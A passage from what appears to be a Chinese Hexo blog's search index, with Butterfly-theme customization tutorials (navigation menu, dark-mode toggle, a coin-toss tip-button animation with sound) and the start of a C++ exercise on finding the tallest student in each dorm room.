(window.getComputedStyle(document.getElementById(&#x27;card-toc&#x27;)).getPropertyValue(&#x27;opacity&#x27;) === &#x27;0&#x27;) window.mobileToc.open() else window.mobileToc.close() &#125; &#125; document.getElementById(&#x27;rightside&#x27;).addEventListener(&#x27;click&#x27;, function (e) &#123; const $target = e.target.id ? e.target : e.target.parentNode switch ($target.id) &#123; case &#x27;go-up&#x27;: rightSideFn.scrollToTop() break case &#x27;rightside_config&#x27;: rightSideFn.showOrHideBtn($target) break case &#x27;mobile-toc-button&#x27;: rightSideFn.runMobileToc() break case &#x27;readmode&#x27;: rightSideFn.switchReadMode() break case &#x27;darkmode&#x27;: rightSideFn.switchDarkMode() break case &#x27;hide-aside-btn&#x27;: rightSideFn.hideAsideBtn() break default: break &#125; &#125;) /** * menu * 側邊欄sub-menu 展開/收縮 */ const clickFnOfSubMenu = () =&gt; &#123; document.querySelectorAll(&#x27;#sidebar-menus .site-page.group&#x27;).forEach(function (item) &#123; item.addEventListener(&#x27;click&#x27;, function () &#123; this.classList.toggle(&#x27;hide&#x27;) &#125;) &#125;) &#125; /** * 複製時加上版權信息 */ const addCopyright = () =&gt; &#123; const copyright = GLOBAL_CONFIG.copyright document.body.oncopy = (e) =&gt; &#123; e.preventDefault() let textFont; const copyFont = window.getSelection(0).toString() if (copyFont.length &gt; copyright.limitCount) &#123; textFont = copyFont + &#x27;\\n&#x27; + &#x27;\\n&#x27; + &#x27;\\n&#x27; + copyright.languages.author + &#x27;\\n&#x27; + copyright.languages.link + window.location.href + &#x27;\\n&#x27; + copyright.languages.source + &#x27;\\n&#x27; + copyright.languages.info &#125; else &#123; textFont = copyFont &#125; if (e.clipboardData) &#123; return e.clipboardData.setData(&#x27;text&#x27;, textFont) &#125; else &#123; return window.clipboardData.setData(&#x27;text&#x27;, textFont) &#125; &#125; &#125; /** * 網頁運行時間 */ const addRuntime = () =&gt; &#123; const $runtimeCount = document.getElementById(&#x27;runtimeshow&#x27;) if ($runtimeCount) &#123; const publishDate = $runtimeCount.getAttribute(&#x27;data-publishDate&#x27;) $runtimeCount.innerText = btf.diffDate(publishDate) + &#x27; &#x27; + GLOBAL_CONFIG.runtime &#125; &#125; /** * 最後一次更新時間 */ const addLastPushDate = () =&gt; &#123; const $lastPushDateItem = document.getElementById(&#x27;last-push-date&#x27;) if ($lastPushDateItem) &#123; const lastPushDate = $lastPushDateItem.getAttribute(&#x27;data-lastPushDate&#x27;) $lastPushDateItem.innerText = btf.diffDate(lastPushDate, true) &#125; &#125; /** * table overflow */ const addTableWrap = () =&gt; &#123; const $table = document.querySelectorAll(&#x27;#article-container :not(.highlight) &gt; table, #article-container &gt; table&#x27;) if ($table.length) &#123; $table.forEach(item =&gt; &#123; btf.wrap(item, &#x27;div&#x27;, &#123; class: &#x27;table-wrap&#x27; &#125;) &#125;) &#125; &#125; /** * tag-hide */ const clickFnOfTagHide = function () &#123; const $hideInline = document.querySelectorAll(&#x27;#article-container .hide-button&#x27;) if ($hideInline.length) &#123; $hideInline.forEach(function (item) &#123; item.addEventListener(&#x27;click&#x27;, function (e) &#123; const $this = this $this.classList.add(&#x27;open&#x27;) const $fjGallery = $this.nextElementSibling.querySelectorAll(&#x27;.fj-gallery&#x27;) $fjGallery.length &amp;&amp; btf.initJustifiedGallery($fjGallery) &#125;) &#125;) &#125; &#125; const tabsFn = &#123; clickFnOfTabs: function () &#123; document.querySelectorAll(&#x27;#article-container .tab &gt; button&#x27;).forEach(function (item) &#123; item.addEventListener(&#x27;click&#x27;, function (e) &#123; const $this = this const $tabItem = $this.parentNode if (!$tabItem.classList.contains(&#x27;active&#x27;)) &#123; const $tabContent = $tabItem.parentNode.nextElementSibling const $siblings = btf.siblings($tabItem, &#x27;.active&#x27;)[0] $siblings &amp;&amp; $siblings.classList.remove(&#x27;active&#x27;) $tabItem.classList.add(&#x27;active&#x27;) const tabId = $this.getAttribute(&#x27;data-href&#x27;).replace(&#x27;#&#x27;, &#x27;&#x27;) const childList = [...$tabContent.children] childList.forEach(item =&gt; &#123; if (item.id === tabId) item.classList.add(&#x27;active&#x27;) else item.classList.remove(&#x27;active&#x27;) &#125;) const $isTabJustifiedGallery = $tabContent.querySelectorAll(`#$&#123;tabId&#125; .fj-gallery`) if ($isTabJustifiedGallery.length &gt; 0) &#123; btf.initJustifiedGallery($isTabJustifiedGallery) &#125; &#125; &#125;) &#125;) &#125;, backToTop: () =&gt; &#123; document.querySelectorAll(&#x27;#article-container .tabs .tab-to-top&#x27;).forEach(function (item) &#123; item.addEventListener(&#x27;click&#x27;, function () &#123; btf.scrollToDest(btf.getEleTop(btf.getParents(this, &#x27;.tabs&#x27;)), 300) &#125;) &#125;) &#125; &#125; const toggleCardCategory = function () &#123; const $cardCategory = document.querySelectorAll(&#x27;#aside-cat-list .card-category-list-item.parent i&#x27;) if ($cardCategory.length) &#123; $cardCategory.forEach(function (item) &#123; item.addEventListener(&#x27;click&#x27;, function (e) &#123; e.preventDefault() const $this = this $this.classList.toggle(&#x27;expand&#x27;) const $parentEle = $this.parentNode.nextElementSibling if (btf.isHidden($parentEle)) &#123; $parentEle.style.display = &#x27;block&#x27; &#125; else &#123; $parentEle.style.display = &#x27;none&#x27; &#125; &#125;) &#125;) &#125; &#125; const switchComments = function () &#123; let switchDone = false const $switchBtn = document.querySelector(&#x27;#comment-switch &gt; .switch-btn&#x27;) $switchBtn &amp;&amp; $switchBtn.addEventListener(&#x27;click&#x27;, function () &#123; this.classList.toggle(&#x27;move&#x27;) document.querySelectorAll(&#x27;#post-comment &gt; .comment-wrap &gt; div&#x27;).forEach(function (item) &#123; if (btf.isHidden(item)) &#123; item.style.cssText = &#x27;display: block;animation: tabshow .5s&#x27; &#125; else &#123; item.style.cssText = &quot;display: none;animation: &#x27;&#x27;&quot; &#125; &#125;) if (!switchDone &amp;&amp; typeof loadOtherComment === &#x27;function&#x27;) &#123; switchDone = true loadOtherComment() &#125; &#125;) &#125; const addPostOutdateNotice = function () &#123; const data = GLOBAL_CONFIG.noticeOutdate const diffDay = btf.diffDate(GLOBAL_CONFIG_SITE.postUpdate) if (diffDay &gt;= data.limitDay) &#123; const ele = document.createElement(&#x27;div&#x27;) ele.className = &#x27;post-outdate-notice&#x27; ele.textContent = data.messagePrev + &#x27; &#x27; + diffDay + &#x27; &#x27; + data.messageNext const $targetEle = document.getElementById(&#x27;article-container&#x27;) if (data.position === &#x27;top&#x27;) &#123; $targetEle.insertBefore(ele, $targetEle.firstChild) &#125; else &#123; $targetEle.appendChild(ele) &#125; &#125; &#125; const lazyloadImg = () =&gt; &#123; window.lazyLoadInstance = new LazyLoad(&#123; elements_selector: &#x27;img&#x27;, threshold: 0, data_src: &#x27;lazy-src&#x27; &#125;) &#125; const relativeDate = function (selector) &#123; selector.forEach(item =&gt; &#123; const $this = item const timeVal = $this.getAttribute(&#x27;datetime&#x27;) $this.innerText = btf.diffDate(timeVal, true) $this.style.display = &#x27;inline&#x27; &#125;) &#125; const unRefreshFn = function () &#123; window.addEventListener(&#x27;resize&#x27;, () =&gt; &#123; adjustMenu(false) btf.isHidden(document.getElementById(&#x27;toggle-menu&#x27;)) &amp;&amp; mobileSidebarOpen &amp;&amp; sidebarFn.close() &#125;) document.getElementById(&#x27;menu-mask&#x27;).addEventListener(&#x27;click&#x27;, e =&gt; &#123; sidebarFn.close() &#125;) clickFnOfSubMenu() GLOBAL_CONFIG.islazyload &amp;&amp; lazyloadImg() GLOBAL_CONFIG.copyright !== undefined &amp;&amp; addCopyright() &#125; window.refreshFn = function () &#123; initAdjust() if (GLOBAL_CONFIG_SITE.isPost) &#123; GLOBAL_CONFIG.noticeOutdate !== undefined &amp;&amp; addPostOutdateNotice() GLOBAL_CONFIG.relativeDate.post &amp;&amp; relativeDate(document.querySelectorAll(&#x27;#post-meta time&#x27;)) &#125; else &#123; GLOBAL_CONFIG.relativeDate.homepage &amp;&amp; relativeDate(document.querySelectorAll(&#x27;#recent-posts time&#x27;)) GLOBAL_CONFIG.runtime &amp;&amp; addRuntime() addLastPushDate() toggleCardCategory() &#125; scrollFnToDo() GLOBAL_CONFIG_SITE.isHome &amp;&amp; scrollDownInIndex() addHighlightTool() GLOBAL_CONFIG.isPhotoFigcaption &amp;&amp; addPhotoFigcaption() scrollFn() const $jgEle = document.querySelectorAll(&#x27;#article-container .fj-gallery&#x27;) $jgEle.length &amp;&amp; runJustifiedGallery($jgEle) runLightbox() addTableWrap() clickFnOfTagHide() tabsFn.clickFnOfTabs() tabsFn.backToTop() switchComments() document.getElementById(&#x27;toggle-menu&#x27;).addEventListener(&#x27;click&#x27;, () =&gt; &#123; sidebarFn.open() &#125;) &#125; refreshFn() unRefreshFn()&#125;) 4. 替换Blog根目录/themes/butterfly/layout/includes/header/index.pug为下列代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051if !theme.disable_top_img &amp;&amp; page.top_img !== false if is_post() - var top_img = page.top_img || page.cover || page.randomcover else if is_page() - var top_img = page.top_img || theme.default_top_img else if is_tag() - var top_img = theme.tag_per_img &amp;&amp; theme.tag_per_img[page.tag] - top_img = top_img ? top_img : (theme.tag_img !== false ? theme.tag_img || theme.default_top_img : false) else if is_category() - var top_img = theme.category_per_img &amp;&amp; theme.category_per_img[page.category] - top_img = top_img ? top_img : (theme.category_img !== false ? theme.category_img || theme.default_top_img : false) else if is_home() - var top_img = theme.index_img !== false ? theme.index_img || theme.default_top_img : false else if is_archive() - var top_img = theme.archive_img !== false ? theme.archive_img || theme.default_top_img : false else - var top_img = page.top_img || theme.default_top_img if top_img !== false - var imgSource = top_img &amp;&amp; top_img.indexOf(&#x27;/&#x27;) !== -1 ? `background-image: url(&#x27;$&#123;url_for(top_img)&#125;&#x27;)` : `background: $&#123;top_img&#125;` - var bg_img = top_img ? imgSource : &#x27;&#x27; - var site_title = page.title || page.tag || page.category || config.title - var isHomeClass = is_home() ? &#x27;full_page nav-fixed nav-visible&#x27; : &#x27;not-home-page&#x27; - is_post() ? isHomeClass = &#x27;post-bg&#x27; : isHomeClass else - var isHomeClass = &#x27;not-top-img&#x27;else - var top_img = false - var isHomeClass = &#x27;not-top-img&#x27;header#page-header(class=isHomeClass style=bg_img) !=partial(&#x27;includes/header/nav&#x27;, &#123;&#125;, &#123;cache: true&#125;) if top_img !== false if is_post() include ./post-info.pug else if is_home() #site-info h1#site-title=site_title if theme.subtitle.enable - var loadSubJs = true #site-subtitle span#subtitle if(theme.social) #site_social_icons !=fragment_cache(&#x27;social&#x27;, function()&#123;return partial(&#x27;includes/header/social&#x27;)&#125;) #scroll-down i.fas.fa-angle-down.scroll-down-effects else #page-site-info h1#site-title=site_title 5. 替换Blog根目录/themes/butterfly/layout/includes/header/nav.pug为下列代码ps：代码中的内容、链接及图标可自行替换 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354- const &#123; darkmode &#125; = themenav#nav span#blog_name .back-home-button(tabindex=&#x27;-1&#x27;) i.back-home-button-icon.fas.fa-grip-vertical .back-menu-list-groups .back-menu-list-group //.back-menu-list-title 网页 .back-menu-list a.back-menu-item(href=&#x27;https://www.dqywy.top&#x27;, title=&#x27;前往首页&#x27;, target=&#x27;_blank&#x27;, one-link-mark=&#x27;yes&#x27;) img.back-menu-item-icon(src=&#x27;https://s1.ax1x.com/2023/05/21/p95hrtI.png&#x27;) span.back-menu-item-text 首页 a.back-menu-item(href=&#x27;https://github.com/hellodqy&#x27;, rel=&#x27;external nofollow&#x27;, title=&#x27;前往Github&#x27;, target=&#x27;_blank&#x27;, one-link-mark=&#x27;yes&#x27;) img.back-menu-item-icon(src=&#x27;https://s1.ax1x.com/2023/05/21/p955aod.png&#x27;) span.back-menu-item-text Github a.back-menu-item(href=&#x27;https://bz.zzzmh.cn/index&#x27;, rel=&#x27;external nofollow&#x27;, title=&#x27;前往壁纸库&#x27;, target=&#x27;_blank&#x27;, one-link-mark=&#x27;yes&#x27;) img.back-menu-item-icon(src=&#x27;https://s1.ax1x.com/2023/05/21/p955ZsU.png&#x27;) span.back-menu-item-text 超赞壁纸 a.back-menu-item(href=&#x27;https://www.iconfont.cn&#x27;, rel=&#x27;noopener nofollow&#x27;, title=&#x27;前往阿里icon&#x27;, target=&#x27;_blank&#x27;, one-link-mark=&#x27;yes&#x27;) img.back-menu-item-icon(src=&#x27;https://s1.ax1x.com/2023/05/21/p9544KO.png&#x27;) span.back-menu-item-text 阿里图标库 a#site-name(href=url_for(&#x27;/&#x27;)) .title #[=config.title] i.fa-solid.fa-house div.mask-name-container center(id=&quot;name-container&quot;) a(id=&quot;page-name&quot; href=&quot;javascript:btf.scrollToDest(0, 500)&quot;) 今天也要元气满满^_^ #weather &lt;div id=&quot;tp-weather-widget&quot;&gt;&lt;/div&gt; #menus if (theme.algolia_search.enable || theme.local_search.enable) div.nav-button#search-button a.site-page.social-icon.search i.fas.fa-search.fa-fw span=&#x27; &#x27;+_p(&#x27;search.title&#x27;) if darkmode.enable &amp;&amp; darkmode.button div.nav-button#darkmode_navswitch a.darkmode_switchbutton(type=&quot;button&quot; title=_p(&#x27;rightside.night_mode_title&#x27;) onclick=&quot;switchDarkMode()&quot;) i.fas.fa-adjust div.nav-button#nav-totop a.totopbtn i.fas.fa-arrow-up span#percent(onclick=&quot;btf.scrollToDest(0,500)&quot;) 0 !=partial(&#x27;includes/header/menu_item&#x27;, &#123;&#125;, &#123;cache: true&#125;) #toggle-menu a.site-page i.fas.fa-bars.fa-fw 6. 打开主题配置文件_config.butterfly.xml12345inject: head: - &lt;link rel=&quot;stylesheet&quot; href=&quot;https://src.ffing.cn/hexo/css/nav_menu.css&quot;&gt; - &lt;script defer src=&quot;https://src.ffing.cn/hexo/js/switchDarkMode.js&quot;&gt;&lt;/script&gt; - &lt;script defer src=&quot;/js/nav_menu.js&quot;&gt;&lt;/script&gt; 7. 重写昼夜转换按钮新建Blog根目录/source/js/switchDarkMode.js，写入下列代码 12345678910111213141516171819/*白天黑夜切换*///切换夜间function switchDarkMode() &#123; const nowMode = document.documentElement.getAttribute(&#x27;data-theme&#x27;) === &#x27;dark&#x27; ? &#x27;dark&#x27; : &#x27;light&#x27; if (nowMode === &#x27;light&#x27;) &#123; activateDarkMode() saveToLocal.set(&#x27;theme&#x27;, &#x27;dark&#x27;, 2) GLOBAL_CONFIG.Snackbar !== undefined &amp;&amp; btf.snackbarShow(GLOBAL_CONFIG.Snackbar.day_to_night) &#125; else &#123; activateLightMode() saveToLocal.set(&#x27;theme&#x27;, &#x27;light&#x27;, 2) GLOBAL_CONFIG.Snackbar !== undefined &amp;&amp; btf.snackbarShow(GLOBAL_CONFIG.Snackbar.night_to_day) &#125; // handle some cases typeof utterancesTheme === &#x27;function&#x27; &amp;&amp; utterancesTheme() typeof changeGiscusTheme === &#x27;function&#x27; &amp;&amp; changeGiscusTheme() typeof FB === &#x27;object&#x27; &amp;&amp; window.loadFBComment() typeof runMermaid === &#x27;function&#x27; &amp;&amp; window.runMermaid()&#125; 8. 引入js123inject: head: - &lt;script src=&quot;/js/switchDarkMode.js&quot;&gt;&lt;/script&gt; 9. hexo三连","tags":"博客美化"},{"title":"打赏功能添加银币图标和音效","url":"/post/1138de43.html","text":"前言转载自：安知鱼butterfly重装日记 效果预览 ps：打赏会有投币特效和┗|｀O′|┛ 嗷~~的一声~ 步骤1. 修改[Blogroot]\\themes\\butterfly\\languages\\zh-CN.yml12345678910date_suffix: just: 刚刚 min: 分钟前 hour: 小时前 day: 天前 month: 个月前- donate: 打赏+ donate: 不给糖果就捣蛋share: 分享 2. 修改[Blogroot]\\themes\\butterfly\\layout\\includes\\post\\reward.pug,整体替换为以下内容123456789101112131415161718192021link(rel=&#x27;stylesheet&#x27; href=url_for(theme.CDN.option.coin_css) media=&quot;defer&quot; onload=&quot;this.media=&#x27;all&#x27;&quot;).post-reward button.tip-button.reward-button span.tip-button__text= _p(&#x27;donate&#x27;) .coin-wrapper .coin .coin__middle .coin__back .coin__front .reward-main ul.reward-all each item in theme.reward.QR_code - var clickTo = (item.itemlist||item).link ? (item.itemlist||item).link : (item.itemlist||item).img li.reward-item a(href=clickTo target=&#x27;_blank&#x27;) img.post-qr-code-img(src=url_for((item.itemlist||item).img) alt=(item.itemlist||item).text) .post-qr-code-desc=(item.itemlist||item).textif theme.reward.coinAudio - var coinAudio = theme.reward.coinAudio ? url_for(theme.reward.coinAudio) : &#x27;https://cdn.cbd.int/akilar-candyassets@1.0.36/audio/coin.mp3&#x27; audio#coinAudio(src=coinAudio)script(defer src=url_for(theme.CDN.option.coin_js)) 3. 新建[Blogroot]source\\css\\coin\\coin.css123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220.tip-button &#123; border: 0; border-radius: 0.25rem; cursor: pointer; font-size: 20px; font-weight: 600; height: 2.6rem; margin-bottom: -4rem; outline: 0; position: relative; top: 0; transform-origin: 0% 100%; transition: transform 50ms ease-in-out; width: auto; -webkit-tap-highlight-color: transparent;&#125;.tip-button:active &#123; transform: rotate(4deg);&#125;.tip-button.clicked &#123; animation: 150ms ease-in-out 1 shake; pointer-events: none;&#125;.tip-button.clicked .tip-button__text &#123; opacity: 0; transition: opacity 100ms linear 200ms;&#125;.tip-button.clicked::before &#123; height: 0.5rem; width: 60%; background: $button-hover-color;&#125;.tip-button.clicked .coin &#123; transition: margin-bottom 1s linear 200ms; margin-bottom: 0;&#125;.tip-button.shrink-landing::before &#123; transition: width 200ms ease-in; width: 0;&#125;.tip-button.coin-landed::after &#123; opacity: 1; transform: scale(1); transform-origin: 50% 100%;&#125;.tip-button.coin-landed .coin-wrapper &#123; background: radial-gradient(circle at 35% 97%, rgba(3, 16, 50, 0.4) 0.04rem, transparent 0.04rem), radial-gradient( circle at 45% 92%, rgba(3, 16, 50, 0.4) 0.04rem, transparent 0.02rem ), radial-gradient(circle at 55% 98%, rgba(3, 16, 50, 0.4) 0.04rem, transparent 0.04rem), radial-gradient(circle at 65% 96%, rgba(3, 16, 50, 0.4) 0.06rem, transparent 0.06rem); background-position: center bottom; background-size: 100%; bottom: -1rem; opacity: 0; transform: scale(2) translateY(-10px);&#125;.tip-button__text &#123; color: #fff; margin-right: 1.8rem; opacity: 1; position: relative; transition: opacity 100ms linear 500ms; z-index: 3;&#125;.tip-button::before &#123; border-radius: 0.25rem; bottom: 0; content: &quot;&quot;; display: block; height: 100%; left: 50%; position: absolute; transform: translateX(-50%); transition: height 250ms ease-in-out 400ms, width 250ms ease-in-out 300ms; width: 100%; z-index: 2;&#125;.tip-button::after &#123; bottom: -1rem; color: white; content: &quot;ヾ(≧O≦)〃嗷~&quot;; /*点击后显示的内容*/ height: 110%; left: 0; opacity: 0; position: absolute; pointer-events: none; text-align: center; transform: scale(0); transform-origin: 50% 20%; transition: transform 200ms cubic-bezier(0, 0, 0.35, 1.43); width: 100%; z-index: 1;&#125;.coin-wrapper &#123; background: none; bottom: 0; height: 18rem; left: 0; opacity: 1; overflow: hidden; pointer-events: none; position: absolute; transform: none; transform-origin: 50% 100%; transition: opacity 200ms linear 100ms, transform 300ms ease-out; width: 100%;&#125;.coin &#123; --front-y-multiplier: 0; --back-y-multiplier: 0; --coin-y-multiplier: 0; --coin-x-multiplier: 0; --coin-scale-multiplier: 0; --coin-rotation-multiplier: 0; --shine-opacity-multiplier: 0.4; --shine-bg-multiplier: 50%; bottom: calc(var(--coin-y-multiplier) * 1rem - 3.5rem); height: 3.5rem; margin-bottom: 3.05rem; position: absolute; right: calc(var(--coin-x-multiplier) * 34% + 16%); transform: translateX(50%) scale(calc(0.4 + var(--coin-scale-multiplier))) rotate(calc(var( --coin-rotation-multiplier ) * -1deg)); transition: opacity 100ms linear 200ms; width: 3.5rem; z-index: 3;&#125;.coin__front,.coin__middle,.coin__back,.coin::before,.coin__front::after,.coin__back::after &#123; border-radius: 50%; box-sizing: border-box; height: 100%; left: 0; position: absolute; width: 100%; z-index: 3;&#125;.coin__front &#123; background: radial-gradient(circle at 50% 50%, transparent 50%, rgba(115, 124, 153, 0.4) 54%, #c2cadf 54%), linear-gradient(210deg, #8590b3 32%, transparent 32%), linear-gradient(150deg, #8590b3 32%, transparent 32%), linear-gradient(to right, #8590b3 22%, transparent 22%, transparent 78%, #8590b3 78%), linear-gradient( to bottom, #fcfaf9 44%, transparent 44%, transparent 65%, #fcfaf9 65%, #fcfaf9 71%, #8590b3 71% ), linear-gradient(to right, transparent 28%, #fcfaf9 28%, #fcfaf9 34%, #8590b3 34%, #8590b3 40%, #fcfaf9 40%, #fcfaf9 47%, #8590b3 47%, #8590b3 53%, #fcfaf9 53%, #fcfaf9 60%, #8590b3 60%, #8590b3 66%, #fcfaf9 66%, #fcfaf9 72%, transparent 72%); background-color: #8590b3; background-size: 100% 100%; transform: translateY(calc(var(--front-y-multiplier) * 0.3181818182rem / 2)) scaleY(var(--front-scale-multiplier));&#125;.coin__front::after &#123; background: rgba(0, 0, 0, 0.2); content: &quot;&quot;; opacity: var(--front-y-multiplier);&#125;.coin__middle &#123; background: #737c99; transform: translateY(calc(var(--middle-y-multiplier) * 0.3181818182rem / 2)) scaleY(var(--middle-scale-multiplier));&#125;.coin__back &#123; background: radial-gradient(circle at 50% 50%, transparent 50%, rgba(115, 124, 153, 0.4) 54%, #c2cadf 54%), radial-gradient(circle at 50% 40%, #fcfaf9 23%, transparent 23%), radial-gradient(circle at 50% 100%, #fcfaf9 35%, transparent 35%); background-color: #8590b3; background-size: 100% 100%; transform: translateY(calc(var(--back-y-multiplier) * 0.3181818182rem / 2)) scaleY(var(--back-scale-multiplier));&#125;.coin__back::after &#123; background: rgba(0, 0, 0, 0.2); content: &quot;&quot;; opacity: var(--back-y-multiplier);&#125;.coin::before &#123; background: radial-gradient(circle at 25% 65%, transparent 50%, rgba(255, 255, 255, 0.9) 90%), linear-gradient(55deg, transparent calc(var(--shine-bg-multiplier) + 0%), #e9f4ff calc(var(--shine-bg-multiplier) + 0%), transparent calc(var( --shine-bg-multiplier ) + 50%)); content: &quot;&quot;; opacity: var(--shine-opacity-multiplier); transform: translateY(calc(var(--middle-y-multiplier) * 0.3181818182rem / -2)) scaleY(var(--middle-scale-multiplier)) rotate(calc(var(--coin-rotation-multiplier) * 1deg)); z-index: 10;&#125;.coin::after &#123; background: #737c99; content: &quot;&quot;; height: 0.3181818182rem; left: 0; position: absolute; top: 50%; transform: translateY(-50%); width: 100%; z-index: 2;&#125;@keyframes shake &#123; 0% &#123; transform: rotate(4deg); &#125; 66% &#123; transform: rotate(-4deg); &#125; 100% &#123; transform: rotate(); &#125;&#125; 4. 新建[Blogroot]\\source\\js\\coin\\coin.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990var tipButtons = document.querySelectorAll(&quot;.tip-button&quot;);function coinAudio() &#123; var coinAudio = document.getElementById(&quot;coinAudio&quot;); if (coinAudio) &#123; coinAudio.play(); //有音频时播放 &#125;&#125;// Loop through all buttons (allows for multiple buttons on page)tipButtons.forEach(button =&gt; &#123; var coin = button.querySelector(&quot;.coin&quot;); // The larger the number, the slower the animation coin.maxMoveLoopCount = 90; button.addEventListener(&quot;click&quot;, () =&gt; &#123; if (/Android|webOS|BlackBerry/i.test(navigator.userAgent)) return true; //媒体选择 if (button.clicked) return; button.classList.add(&quot;clicked&quot;); // Wait to start flipping th coin because of the button tilt animation setTimeout(() =&gt; &#123; // Randomize the flipping speeds just for fun coin.sideRotationCount = Math.floor(Math.random() * 5) * 90; coin.maxFlipAngle = (Math.floor(Math.random() * 4) + 3) * Math.PI; button.clicked = true; flipCoin(); coinAudio(); &#125;, 50); &#125;); var flipCoin = () =&gt; &#123; coin.moveLoopCount = 0; flipCoinLoop(); &#125;; var resetCoin = () =&gt; &#123; coin.style.setProperty(&quot;--coin-x-multiplier&quot;, 0); coin.style.setProperty(&quot;--coin-scale-multiplier&quot;, 0); coin.style.setProperty(&quot;--coin-rotation-multiplier&quot;, 0); coin.style.setProperty(&quot;--shine-opacity-multiplier&quot;, 0.4); coin.style.setProperty(&quot;--shine-bg-multiplier&quot;, &quot;50%&quot;); coin.style.setProperty(&quot;opacity&quot;, 1); // Delay to give the reset animation some time before you can click again setTimeout(() =&gt; &#123; button.clicked = false; &#125;, 300); &#125;; var flipCoinLoop = () =&gt; &#123; coin.moveLoopCount++; var percentageCompleted = coin.moveLoopCount / coin.maxMoveLoopCount; coin.angle = -coin.maxFlipAngle * Math.pow(percentageCompleted - 1, 2) + coin.maxFlipAngle; // Calculate the scale and position of the coin moving through the air coin.style.setProperty(&quot;--coin-y-multiplier&quot;, -11 * Math.pow(percentageCompleted * 2 - 1, 4) + 11); coin.style.setProperty(&quot;--coin-x-multiplier&quot;, percentageCompleted); coin.style.setProperty(&quot;--coin-scale-multiplier&quot;, percentageCompleted * 0.6); coin.style.setProperty(&quot;--coin-rotation-multiplier&quot;, percentageCompleted * coin.sideRotationCount); // Calculate the scale and position values for the different coin faces // The math uses sin/cos wave functions to similate the circular motion of 3D spin coin.style.setProperty(&quot;--front-scale-multiplier&quot;, Math.max(Math.cos(coin.angle), 0)); coin.style.setProperty(&quot;--front-y-multiplier&quot;, Math.sin(coin.angle)); coin.style.setProperty(&quot;--middle-scale-multiplier&quot;, Math.abs(Math.cos(coin.angle), 0)); coin.style.setProperty(&quot;--middle-y-multiplier&quot;, Math.cos((coin.angle + Math.PI / 2) % Math.PI)); coin.style.setProperty(&quot;--back-scale-multiplier&quot;, Math.max(Math.cos(coin.angle - Math.PI), 0)); coin.style.setProperty(&quot;--back-y-multiplier&quot;, Math.sin(coin.angle - Math.PI)); coin.style.setProperty(&quot;--shine-opacity-multiplier&quot;, 4 * Math.sin((coin.angle + Math.PI / 2) % Math.PI) - 3.2); coin.style.setProperty(&quot;--shine-bg-multiplier&quot;, -40 * (Math.cos((coin.angle + Math.PI / 2) % Math.PI) - 0.5) + &quot;%&quot;); // Repeat animation loop if (coin.moveLoopCount &lt; coin.maxMoveLoopCount) &#123; if (coin.moveLoopCount === coin.maxMoveLoopCount - 6) button.classList.add(&quot;shrink-landing&quot;); window.requestAnimationFrame(flipCoinLoop); &#125; else &#123; button.classList.add(&quot;coin-landed&quot;); coin.style.setProperty(&quot;opacity&quot;, 0); setTimeout(() =&gt; &#123; button.classList.remove(&quot;clicked&quot;, &quot;shrink-landing&quot;, &quot;coin-landed&quot;); setTimeout(() =&gt; &#123; resetCoin(); &#125;, 300); &#125;, 1500); &#125; &#125;;&#125;); 5. 修改_config.butterfly.yml,添加音频文件配置项，添加 CDN 配置项：123456789101112131415161718192021 # Sponsor/reward reward: enable: true+ coinAudio: https://cdn.cbd.int/akilar-candyassets@1.0.36/audio/aowu.m4a QR_code: - img: https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png link: text: wechat - img: https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png link: text: alipay CDN: # main main_css: /css/index.css jquery: https://cdn.cbd.int/jquery@latest/dist/jquery.min.js main: /js/main.js utils:/js/utils.js option:+ # 打赏按钮投币效果+ coin_js: /js/coin/coin.js+ coin_css: /css/coin/coin.css 6. 修改[Blogroot]\\themes\\butterfly\\source\\css\\_layout\\reward.styl，整体替换为以下内容注意：如果打赏图片有两张的话，请将下列代码中的.reward-main模块中的width改为200% 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071.post-reward position: relative margin-top: 4rem width: 100% text-align: center .reward-button display: inline-block padding: .2rem 1.2rem background: var(--btn-bg) color: var(--btn-color) cursor: pointer transition: all .4s &amp;:hover box-shadow: inset 15em 0 0 0 var(--btn-hover-color) .reward-main display: block .reward-main position: absolute bottom: 40px left: -25% z-index: 100 display: none padding: 0 0 15px width: 150% .reward-all display: inline-block margin: 0 padding: 1rem .5rem border-radius: 4px background: var(--reward-pop) &amp;:before position: absolute bottom: -10px left: 0 width: 100% height: 20px content: &#x27;&#x27; &amp;:after position: absolute right: 0 bottom: 2px left: 0 margin: 0 auto width: 0 height: 0 border-top: 13px solid var(--reward-pop) border-right: 13px solid transparent border-left: 13px solid transparent content: &#x27;&#x27; .reward-item display: inline-block padding: 0 8px list-style-type: none vertical-align: top img width: 130px height: 130px .post-qr-code-desc padding-top: .4rem width: 130px color: $reward-pop-up-color 7. hexo三连","tags":"博客美化"},{"title":"寝室谁最高","url":"/post/257e828a.html","text":"【问题描述】 学校选拔篮球队员，每间宿舍最多有 4 个人。现给出宿舍列表，请找出每个宿舍最高的同学。定义一个学生类 Student，有身高 height，体重 weight 等。 【输入格式】 首先输入一个整型数 n （1≤n≤106），表示有 n 位同学。 紧跟着 n 行输入，每一行格式为：宿舍号 name height weight。宿舍号的区间为 [0, 999999]， name 由字母组成，长度小于 16，height，weight 为正整数。 【输出格式】 按宿舍号从小到大排序，输出每间宿舍身高最高的同学信息。题目保证每间宿舍只有一位身高最高的同学。 注意宿舍号不足 6 位的，要按 6 位补齐前导 0。 【输入样例】 7 000000 Tom 175 120 000001 Jack 180 130 000001 Hale 160 140 000000 Marry 160 120 000000 Jerry 165 110 000003 ETAF 183 145 000001 Mickey 170 115 【输出样例】 000000 Tom 175 120 000001 Jack 180 130 000003 ETAF 183 145 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;#include &lt;algorithm&gt;#include &lt;iomanip&gt;using namespace std;class 